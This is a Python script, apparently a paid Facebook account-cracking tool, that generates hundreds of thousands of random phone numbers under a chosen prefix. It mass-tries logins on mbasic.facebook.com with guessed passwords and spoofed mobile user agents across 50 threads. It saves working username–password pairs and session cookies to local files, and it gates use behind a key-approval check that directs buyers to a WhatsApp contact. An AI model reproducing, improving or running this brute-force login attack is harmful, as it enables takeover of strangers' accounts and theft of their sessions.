import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\\033[1;91m [✔] Sorry there is no Active  Apk ')
    else:
        print(f'\r \033[1;92m[✔] Your Active Apps :{WHITE}' )
        for i in range(len(game)):
            print(f"\r [%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\\033[1;91m [✔] Sorry there is no Expired Apk\n')
    else:
        print(f'\\033[1;92m [✔] Your Expired Apps   :{WHITE}')
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')


class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo ="""\033[1;97m
  ██████╗ ███████╗    ██████╗     ██╗  ██╗
██╔════╝ ██╔════╝    ╚════██╗    ╚██╗██╔╝
██║  ███╗███████╗     █████╔╝     ╚███╔╝ 
██║   ██║╚════██║    ██╔═══╝      ██╔██╗ 
╚██████╔╝███████║    ███████╗    ██╔╝ ██╗
 ╚═════╝ ╚══════╝    ╚══════╝    ╚═╝  ╚═╝
\033[1;92m╔═════════════════════════════════════════╗
\033[1;92m║ ᗙ  Owner    : MD RIYAD                  ║
\033[1;92m║ ᗙ  Facebook : MD.RIYAD                  ║
\033[1;92m║ ᗙ  Version  : 0.1                       ║
\033[1;92m║ ᗙ  Team     : GS POWER                  ║ 
\033[1;92m╚═════════════════════════════════════════╝"""
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
 


ugen2 = []
ugen = []
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    
def gs2x():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m Example \033[1;91m>>\033[1;92m 0171 \033[1;91m<>\033[1;92m 0175 <<')
    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
    code = input('\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m CHOOSE GP CODE\033[1;91m>>\033[1;92m ')
    limit = 500000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    RimonID = []
    print("")
    for bilal in range(passx):
        pww = 0
        RimonID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m YOUR SLECTED SIM \033[1;91m>>\033[1;96m '+code)
        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m TOTAL IDS \033[1;91m>>\033[1;93m '+tl)
        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m THE PROCESS HAS BEEN STARTED')
        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\x1b[38;5;208m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in RimonID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(new,uid,pwx,tl)
    print('\n\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Crack process has been completed')
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Ids saved in POM/ok.txt,POM/cp.txt')
    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')

def new(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(' \n\x1b[38;5;196m[\x1b[38;5;46mHOT\x1b[38;5;196m]\x1b[38;5;46m ' +uid+ '\x1b[38;5;46m  ✔  \x1b[38;5;46m' +ps+ '\n  COOKIES\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m '+coki+'')                
                open('/sdcard/POM-OK.TXT', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                #print('[CP] ' +uid+ '|' +ps+ '')
                open('/sdcard/POM-CP.TXT', 'a').write( uid+' | '+ps+'')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r \x1b[38;5;196m[\x1b[38;5;46mMAGI\x1b[38;5;196m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
        sys.stdout.flush()
    except:
        pass
def menu_apikey():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "⁙.".join(uuid)
  server = requests.get('https://github.com/GS XDBRAND/BRAND/blob/main/Approval.txt').text
  
 

  os.system(" clear")                          
  print("""\033[1;37m
  ██████╗ ███████╗    ██████╗     ██╗  ██╗
██╔════╝ ██╔════╝    ╚════██╗    ╚██╗██╔╝
██║  ███╗███████╗     █████╔╝     ╚███╔╝ 
██║   ██║╚════██║    ██╔═══╝      ██╔██╗ 
╚██████╔╝███████║    ███████╗    ██╔╝ ██╗
 ╚═════╝ ╚══════╝    ╚══════╝    ╚═╝  ╚═╝
\033[1;92m╔═════════════════════════════════════════╗
\033[1;92m║ ᗙ  Owner    : MD RIYAD                  ║
\033[1;92m║ ᗙ  Facebook : MD.RIYAD                  ║
\033[1;92m║ ᗙ  Version  : 1.0                       ║
\033[1;92m║ ᗙ  Team     : GS POWER                  ║ 
\033[1;92m╚═════════════════════════════════════════╝""")

  print("\033[1;37m--------------------------------------------------")

  print("\x1b[1;92m THIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")

  print("\033[1;37m--------------------------------------------------")
  print("")
  print("\033[1;37m ╔═══════════════════════════════════════════════╗ ")
  print("\x1b[1;92m       YOUR  KEY : "+id)
  print("\033[1;37m ╚═══════════════════════════════════════════════╝ ")
  print("")
  print("\033[1;37m--------------------------------------------------")
  print("\033[1;37m-------> CONTACT ADMIN To BUY This TOOLS <--------   ");
  print("\033[1;37m--------------------------------------------------")
  print("")
  print("  SEND KEY ON ADMIN WHATSAPP,,,,,, ");
  os.system('xdg-open https://wa.me/+8801836751224')
  print("");
  print("\x1b[1;97m  CHECKING YOUR APROVAL....                                             ");
  print("")
  try:
    httpCaht = requests.get("https://github.com/mdtasin123/Approval.txt/blob/main/Approval.txt").text
    if id in httpCaht:
      print("\033[1;97m   YOUR KEY APROVED ");
      msg = str(os.geteuid())
      
      pass
    else:
      
      
      
      os.system('xdg-open https://www.facebook.com/gsriyad11')
     
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	menu_apikey()
menu_apikey() 



def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/mdtasin123/Approval.txt/blob/main/Approval.txt').text
  


  os.system(" clear ")
  print(logo)
  print(" Wait bro,,,, ")
  print(" Chacking Your Aproval ")
  print("\x1b[1;97m  CHECKING YOUR APROVAL.....                                          ");
  try:
    httpCaht = requests.get("https://github.com/mdtasin123/Approval.txt/blob/main/Approval.txt").text
    if id in httpCaht:
      print("\033[1;97m   YOUR KEY APROVED ");
      msg = str(os.geteuid())
     
      pass
    else:
      
      
      os.system('xdg-open https://wa.me/+8801836751224')
      
      sys.exit()
  except:
    sys.exit()
    if name == '__main__': 
    	print(logo)
    	menu_apikey()


gs2x()